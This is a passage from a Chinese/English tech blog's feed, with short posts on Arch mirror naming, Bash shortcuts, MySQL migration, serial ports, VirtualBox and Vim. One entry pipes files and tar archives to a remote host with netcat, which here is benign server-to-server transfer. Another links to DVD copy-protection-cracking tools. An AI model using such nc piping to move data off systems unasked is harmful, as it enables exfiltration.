&lt;p&gt;&lt;img alt="Province of China" src="/files/pacman-mirrorlist-taiwan-vs-taiwan-province-of-china/province_of_china.png" /&gt;  &lt;/p&gt;
&lt;p&gt;所以就確定是最近發生的事了  &lt;/p&gt;
&lt;p&gt;不過我不太清楚改回來的原因是啥&lt;br /&gt;
（其實我也不知道當初被從 Taiwan 改成 Taiwan (Province of China) 的原因）&lt;br /&gt;
發個&lt;a href="http://www.plurk.com/p/ki0evh"&gt;噗浪狀態&lt;/a&gt;後就有人跑去要求 &lt;a href="https://bugs.archlinux.org/task/30444#actionbuttons"&gt;re-open&lt;/a&gt; 了 囧  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;2014-10-29: A request to re-open the task has been made. Reason for request: ISO claimed that the country name is not part of the ISO 3166 standard, thus it's still a WONTFIX for the upstream, ArchLinux is responsible for the issue for regarding something not-in-fact-in-a-standard as standard, thus request re-open. Falling back to the complex procedure of finding country names &lt;em&gt;least&lt;/em&gt; irritating for everyone is both sane and required.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img alt="Re-open" src="/files/pacman-mirrorlist-taiwan-vs-taiwan-province-of-china/re_open.png" /&gt;  &lt;/p&gt;
&lt;p&gt;且看這次會如何回應吧?  &lt;/p&gt;
&lt;hr /&gt;
&lt;h1&gt;Reference&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://planykao.blogspot.tw/2012/07/taiwan-is-not-province-of-china.html"&gt;http://planykao.blogspot.tw/2012/07/taiwan-is-not-province-of-china.html&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="Linux"></category><category term="Taiwan"></category><category term="Arch Linux"></category><category term="pacman"></category><category term="mirrorlist"></category></entry><entry><title>防拷貝 DVD 光碟燒錄</title><link href="https://blog.m157q.tw/posts/2014/10/28/how-to-copy-the-copy-protected-dvd-on-windows/" rel="alternate"></link><published>2015-10-28T15:30:00+08:00</published><updated>2015-10-28T15:30:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2014-10-28:posts/2014/10/28/how-to-copy-the-copy-protected-dvd-on-windows/</id><summary type="html">&lt;p&gt;在 FB 被妹子問  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;「要怎麼拷貝有防拷機制的 DVD？」&lt;br /&gt;
「要怎麼知道光碟機有沒有燒錄功能？」  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;自己也沒弄過，而且現在 DVD 的需求也很低了吧？&lt;br /&gt;
姑且當個好人幫她 Google 一下，記錄起來。  &lt;/p&gt;
&lt;hr /&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://briian.com/tag/%E7%A0%B4%E9%98%B2%E6%8B%B7"&gt;重灌狂人 - 破防拷&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;裡面有蠻多文章提供做法與可用的軟體  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://tw.knowledge.yahoo.com/question/question?qid=1012012901953"&gt;光碟機與燒錄機如何分辨&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;一般來說不要太舊的光碟機應該是都直接就有燒錄功能了啦... 燒錄機真的是很短暫時代的產物...  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;燒錄機機身會顯示 CD R/RW 或 DVD R/RW&lt;br /&gt;
光碟機機身會顯示 CD ROM 或 DVD ROM  &lt;/p&gt;
&lt;/blockquote&gt;</summary><category term="DVD"></category><category term="Windows"></category><category term="Copy Protected"></category></entry><entry><title>Simple File Transmission by using Netcat</title><link href="https://blog.m157q.tw/posts/2014/10/22/simple-file-transmission-by-using-netcat/" rel="alternate"></link><published>2015-10-28T13:57:00+08:00</published><updated>2015-10-28T13:57:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2014-10-22:posts/2014/10/22/simple-file-transmission-by-using-netcat/</id><summary type="html">&lt;h2&gt;Scenario&lt;/h2&gt;
&lt;p&gt;把檔案從 Server A (傳送方) 傳到 Server B (接收方)&lt;br /&gt;
B(接收方)先用 &lt;code&gt;nc&lt;/code&gt; 把 port 打開&lt;br /&gt;
下面的 &lt;code&gt;$TARGETSERVER&lt;/code&gt; 指的就是 B 的 ip&lt;br /&gt;
A(傳送方)再丟檔案過去  &lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;不用打包的話 （單一檔案）&lt;/h3&gt;
&lt;p&gt;B : &lt;code&gt;nc -l $PORT &amp;gt; $FILENAME&lt;/code&gt;&lt;br /&gt;
A : &lt;code&gt;cat $FILENAME | nc $TARGETSERVER $PORT&lt;/code&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;如果需要打包的話 （資料夾）&lt;/h3&gt;
&lt;p&gt;以 .tar 為例  &lt;/p&gt;
&lt;p&gt;B : &lt;code&gt;nc -l $PORT | tar xvf -&lt;/code&gt;  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;從 &lt;code&gt;stdin&lt;/code&gt; 收到後直接解開成資料夾  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;A : &lt;code&gt;tar cvf - $DIRNAME | nc $TARGETSERVER $PORT&lt;/code&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h4&gt;如果傳到B後不想直接解開&lt;/h4&gt;
&lt;p&gt;ex: 想放在 &lt;code&gt;/usr/ports/distfiles&lt;/code&gt; 裏面  &lt;/p&gt;
&lt;p&gt;B : &lt;code&gt;nc -l $PORT &amp;gt; $DIRNAME.tar&lt;/code&gt;  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;收到後直接變成 &lt;code&gt;.tar&lt;/code&gt; 檔  &lt;/p&gt;
&lt;/blockquote&gt;</summary><category term="CLI"></category><category term="NetCat"></category><category term="nc"></category></entry><entry><title>Bash Cheat Sheet</title><link href="https://blog.m157q.tw/posts/2014/10/16/bash-cheat-sheet/" rel="alternate"></link><published>2015-10-28T14:17:00+08:00</published><updated>2015-10-28T14:17:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2014-10-16:posts/2014/10/16/bash-cheat-sheet/</id><summary type="html">&lt;h1&gt;Bash Hotkey Cheat Sheet&lt;/h1&gt;
&lt;!--more--&gt;

&lt;h2&gt;Moving the cursor&lt;/h2&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Hotkey&lt;/th&gt;
&lt;th&gt;Detail&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Ctrl + a&lt;/td&gt;
&lt;td&gt;Go to the beginning of the line (Home)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Ctrl + e&lt;/td&gt;
&lt;td&gt;Go to the End of the line (End)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Ctrl + p&lt;/td&gt;
&lt;td&gt;Previous command (Up arrow)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Ctrl + n&lt;/td&gt;
&lt;td&gt;Next command (Down arrow)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Alt + b&lt;/td&gt;
&lt;td&gt;Back (left) one word&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Alt + f&lt;/td&gt;
&lt;td&gt;Forward (right) one word&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Ctrl + f&lt;/td&gt;
&lt;td&gt;Forward one character&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Ctrl + b&lt;/td&gt;
&lt;td&gt;Backward one character&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Ctrl + xx&lt;/td&gt;
&lt;td&gt;Toggle between the start of line and current cursor position&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2&gt;Editing&lt;/h2&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Hotkey&lt;/th&gt;
&lt;th&gt;Detail&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Ctrl + L&lt;/td&gt;
&lt;td&gt;Clear the Screen, similar to the clear command&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Ctrl + u&lt;/td&gt;
&lt;td&gt;Cut/delete the line before the cursor position.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Alt + Del&lt;/td&gt;
&lt;td&gt;Delete the Word before the cursor.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Alt + d&lt;/td&gt;
&lt;td&gt;Delete the Word after the cursor.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Ctrl + d&lt;/td&gt;
&lt;td&gt;Delete character under the cursor&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Ctrl + h&lt;/td&gt;
&lt;td&gt;Delete character before the cursor (Backspace)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Ctrl + w&lt;/td&gt;
&lt;td&gt;Cut the Word before the cursor to the clipboard.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Ctrl + k&lt;/td&gt;
&lt;td&gt;Cut the Line after the cursor to the clipboard.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Alt + t&lt;/td&gt;
&lt;td&gt;Swap current word with previous&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Ctrl + t&lt;/td&gt;
&lt;td&gt;Swap the last two characters before the cursor (typo).&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Esc  + t&lt;/td&gt;
&lt;td&gt;Swap the last two words before the cursor.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Ctrl + y&lt;/td&gt;
&lt;td&gt;Paste the last thing to be cut (yank)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Alt + u&lt;/td&gt;
&lt;td&gt;UPPER capitalize every character from the cursor to the end of the current word.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Alt + l&lt;/td&gt;
&lt;td&gt;Lower the case of every character from the cursor to the end of the current word.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Alt + c&lt;/td&gt;
&lt;td&gt;Capitalize the character under the cursor and move to the end of the word.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Alt + r&lt;/td&gt;
&lt;td&gt;Cancel the changes and put back the line as it was in the history (revert).&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Ctrl + _&lt;/td&gt;
&lt;td&gt;Undo&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;TAB&lt;/td&gt;
&lt;td&gt;Tab completion for file/directory names.  For example, to move to a directory            'sample1'; Type cd sam ; then press TAB and ENTER.  type just enough characters to uniquely identify  the directory you wish to open.&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2&gt;History&lt;/h2&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Hotkey&lt;/th&gt;
&lt;th&gt;Detail&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Ctrl + r&lt;/td&gt;
&lt;td&gt;Recall the last command including the specified character(s) searches the command history as you type. Equivalent to : vim ~/.bash_history.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Ctrl + p&lt;/td&gt;
&lt;td&gt;Previous command in history (i.e. walk back through the command history)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Ctrl + n&lt;/td&gt;
&lt;td&gt;Next command in history (i.e. walk forward through the command history)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Ctrl + s&lt;/td&gt;
&lt;td&gt;Go back to the next most recent command. (beware to not execute it from a terminal because this will also launch its XOFF).&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Ctrl + o&lt;/td&gt;
&lt;td&gt;Execute the command found via Ctrl+r or Ctrl+s&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Ctrl + g&lt;/td&gt;
&lt;td&gt;Escape from history searching mode&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;!!&lt;/td&gt;
&lt;td&gt;Repeat last command&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;!abc&lt;/td&gt;
&lt;td&gt;Run last command starting with abc&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;!abc:p&lt;/td&gt;
&lt;td&gt;Print last command starting with abc&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;!$&lt;/td&gt;
&lt;td&gt;Last argument of previous command&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;ALT + .&lt;/td&gt;
&lt;td&gt;Last argument of previous command&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;!*&lt;/td&gt;
&lt;td&gt;All arguments of previous command&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;^abc­^­def&lt;/td&gt;
&lt;td&gt;Run previous command, replacing abc with def&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h4&gt;Process control&lt;/h4&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Hotkey&lt;/th&gt;
&lt;th&gt;Detail&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Ctrl + C&lt;/td&gt;
&lt;td&gt;Interrupt/Kill whatever you are running (SIGINT)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Ctrl + l&lt;/td&gt;
&lt;td&gt;Clear the screen&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Ctrl + s&lt;/td&gt;
&lt;td&gt;Stop output to the screen (for long running verbose commands)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Ctrl + q&lt;/td&gt;
&lt;td&gt;Allow output to the screen (if previously stopped using command above)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Ctrl + D&lt;/td&gt;
&lt;td&gt;Send an EOF marker, unless disabled by an option, this will close the current shell (EXIT)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Ctrl + Z&lt;/td&gt;
&lt;td&gt;Send the signal SIGTSTP to the current task, which suspends it. To return to it later enter fg 'process name' (foreground).&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2&gt;Emacs mode vs Vi Mode&lt;/h2&gt;
&lt;p&gt;All the above assume that bash is running in the default Emacs setting, if you prefer this can be switched to Vi shortcuts instead.  &lt;/p&gt;
&lt;p&gt;Set Vi Mode in bash:&lt;br /&gt;
&lt;code&gt;$ set -o vi&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;Set Emacs Mode in bash:&lt;br /&gt;
&lt;code&gt;$ set -o emacs&lt;/code&gt;  &lt;/p&gt;
&lt;h1&gt;References&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;English  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://ss64.com/bash/syntax-keyboard.html"&gt;Bash Keyboard Shortcuts&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.slashroot.in/bash-shell-shortcuts-every-system-administrator-must-know"&gt;Bash shell shortcuts that every system administrator must know&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.skorks.com/2009/09/bash-shortcuts-for-maximum-productivity/"&gt;Bash Shortcuts For Maximum Productivity&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Chinese  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://blog.longwin.com.tw/2006/09/bash_hot_key_2006/"&gt;Bash Shell 快速鍵&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://roclinux.cn/?p=864"&gt;休息五分钟，学几个bash快捷键&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://linuxtoy.org/archives/bash-shortcuts.html"&gt;让你提升命令行效率的 Bash 快捷键 [完整版]&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="CLI"></category><category term="bash"></category><category term="Cheat Sheet"></category></entry><entry><title>Use screen Command to Access Serial Port</title><link href="https://blog.m157q.tw/posts/2014/10/16/use-screen-command-to-access-serial-port/" rel="alternate"></link><published>2014-10-16T08:12:00+08:00</published><updated>2014-10-16T08:12:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2014-10-16:posts/2014/10/16/use-screen-command-to-access-serial-port/</id><summary type="html">&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ screen /dev/ttyS0 &lt;span class="m"&gt;19200&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;blockquote&gt;
&lt;p&gt;This command simply opens up a connection to serial port 0 (ttyS0) with a baud speed/rate of 19200  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt;References&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://apple.stackexchange.com/questions/32834/is-there-an-os-x-terminal-program-that-can-access-serial-ports"&gt;Is there an OS X terminal program that can access serial ports?&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://serverfault.com/questions/81544/hidden-features-of-screen/81548"&gt;Hidden Features of &lt;code&gt;screen&lt;/code&gt;&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="CLI"></category><category term="screen"></category><category term="serial port"></category></entry><entry><title>Solution for the Failure to Attach USB Device in VirtualBox</title><link href="https://blog.m157q.tw/posts/2014/10/16/solution-for-the-failure-to-attach-usb-device-in-virtualbox/" rel="alternate"></link><published>2016-05-03T20:32:00+08:00</published><updated>2016-05-03T20:32:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2014-10-16:posts/2014/10/16/solution-for-the-failure-to-attach-usb-device-in-virtualbox/</id><summary type="html">&lt;h2&gt;Solution&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://forums.virtualbox.org/viewtopic.php?t=10276"&gt;virtualbox.org • View topic - Failed to Attach the USB Device SigmaTel, Inc. STIr42xx&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Steps&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;Settings  &lt;/li&gt;
&lt;li&gt;Ports  &lt;/li&gt;
&lt;li&gt;USB  &lt;/li&gt;
&lt;li&gt;Add a new USB Filter  &lt;/li&gt;
&lt;li&gt;Choose device which cannot be attached  &lt;/li&gt;
&lt;li&gt;Clear all fields except the name  &lt;/li&gt;
&lt;li&gt;Unplug the USB device  &lt;/li&gt;
&lt;li&gt;Plug in the USB device again  &lt;/li&gt;
&lt;li&gt;Attach the USB device to guest  &lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;This method should work.  &lt;/p&gt;</summary><category term="VirtualBox"></category><category term="USB"></category></entry><entry><title>Some Problems Encountered During MySQL Migration</title><link href="https://blog.m157q.tw/posts/2014/08/31/some-problems-encountered-during-mysql-migration/" rel="alternate"></link><published>2015-10-26T14:48:00+08:00</published><updated>2015-10-26T14:48:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2014-08-31:posts/2014/08/31/some-problems-encountered-during-mysql-migration/</id><summary type="html">&lt;h3&gt;Some encountered errors&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;ERROR 1215 (HY000): Cannot add foreign key constraint&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;in mysql shell: &lt;code&gt;SET GLOBAL FOREIGN_KEY_CHECKS = 0;&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;in mysql =&amp;gt; not worked  &lt;/li&gt;
&lt;li&gt;add into backup.sql =&amp;gt; not worked  &lt;/li&gt;
&lt;li&gt;finally deleted the foreign key constraint line in &lt;code&gt;backup.sql&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ERROR 1367 (22007): Illegal double&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;$ replace 1.79769313486232e+308 \'1.79769313486232e+308\' -- backup.sql&lt;/code&gt; can solve the problem (bug).  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;hr /&gt;
&lt;h3&gt;Backup&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;On local server  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;mysqldump -f --all-databases --password='xxx' &amp;gt; /tmp/bakcup.sql&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Use &lt;code&gt;scp&lt;/code&gt; or other command to transfter the &lt;code&gt;backup.sql&lt;/code&gt; to destination server  &lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;Restore&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;On destination server  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;mysql -u user -p &amp;lt; /tmp/backup.sql&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;Use the Force&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;mysql --force -u user -p &amp;lt; /tmp/backup.sql&lt;/code&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;References&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Backup / Restore  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://snipt.net/danfreak/backup-and-restore-all-mysql-databases-with-2-simple-commands/"&gt;https://snipt.net/danfreak/backup-and-restore-all-mysql-databases-with-2-simple-commands/&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;ERROR 1215 (HY000): Cannot add foreign key constraint  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://forums.mysql.com/read.php?35,581311,581311#msg-581311"&gt;http://forums.mysql.com/read.php?35,581311,581311#msg-581311&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://stackoverflow.com/questions/16608042/error-1215-hy000-cannot-add-foreign-key-constraint"&gt;http://stackoverflow.com/questions/16608042/error-1215-hy000-cannot-add-foreign-key-constraint&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://stackoverflow.com/questions/18930084/mysql-error-1215-hy000-cannot-add-foreign-key-constraint"&gt;http://stackoverflow.com/questions/18930084/mysql-error-1215-hy000-cannot-add-foreign-key-constraint&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://dev.mysql.com/doc/refman/5.6/en/server-system-variables.html#sysvar_foreign_key_checks"&gt;http://dev.mysql.com/doc/refman/5.6/en/server-system-variables.html#sysvar_foreign_key_checks&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;ERROR 1367 (22007): Illegal double  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://dba.stackexchange.com/questions/7885/error-on-import-of-mysqldump-file-illegal-double-value-found-during-parsing"&gt;http://dba.stackexchange.com/questions/7885/error-on-import-of-mysqldump-file-illegal-double-value-found-during-parsing&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://bugs.mysql.com/bug.php?id=44995"&gt;http://bugs.mysql.com/bug.php?id=44995&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="MySQL"></category><category term="Database"></category><category term="sysadmin"></category></entry><entry><title>Manage /etc/group and /etc/gshadow</title><link href="https://blog.m157q.tw/posts/2014/08/12/manage-etcgroup-and-etcgshadow/" rel="alternate"></link><published>2014-08-12T20:45:00+08:00</published><updated>2014-08-12T20:45:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2014-08-12:posts/2014/08/12/manage-etcgroup-and-etcgshadow/</id><summary type="html">&lt;ul&gt;
&lt;li&gt;&lt;code&gt;# vigr&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;edit &lt;code&gt;/etc/group&lt;/code&gt; file  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;# grpconv&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;generate new &lt;code&gt;/etc/gshadow&lt;/code&gt; file based on &lt;code&gt;/etc/group&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;# grpck&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;cross-comparison the members in groups of &lt;code&gt;/etc/group&lt;/code&gt; and &lt;code&gt;/etc/gshadow&lt;/code&gt;, it will also detect wrong or useless syntax.  &lt;/li&gt;
&lt;li&gt;(For me, it's a little bit like tell you the result of &lt;code&gt;vimdiff /etc/group /etc/gshadow&lt;/code&gt; directly)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="CLI"></category><category term="sysadmin"></category><category term="vigr"></category><category term="grpck"></category><category term="grpconv"></category><category term="gshadow"></category></entry><entry><title>Wrong % (matching parens searching) action in Vim</title><link href="https://blog.m157q.tw/posts/2014/08/12/wrong-matching-parens-searching-action-in-vim/" rel="alternate"></link><published>2015-10-26T13:04:00+08:00</published><updated>2015-10-26T13:04:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2014-08-12:posts/2014/08/12/wrong-matching-parens-searching-action-in-vim/</id><summary type="html">&lt;p&gt;&lt;code&gt;cpoptions&lt;/code&gt; in Vim is so complicated...  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;{'{,''}’}&lt;/code&gt; this pattern will cause a wrong &lt;code&gt;%&lt;/code&gt; action (MATCHING PARENTHESES SEARCH) in Vim with default &lt;code&gt;cpoptions&lt;/code&gt; flag.  &lt;/p&gt;
&lt;p&gt;A real Example in JavaScript  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;~&lt;/span&gt;&lt;span class="nx"&gt;item&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;indexOf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;\n &amp;#39;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;  
    &lt;span class="nx"&gt;space&lt;/span&gt; &lt;span class="o"&gt;-=&lt;/span&gt; &lt;span class="nx"&gt;item&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;length&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;  
    &lt;span class="nx"&gt;item&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;options&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;pedantic&lt;/span&gt;  
      &lt;span class="o"&gt;?&lt;/span&gt; &lt;span class="nx"&gt;item&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;replace&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nb"&gt;RegExp&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;^ {1,&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nx"&gt;space&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;}&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;gm&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
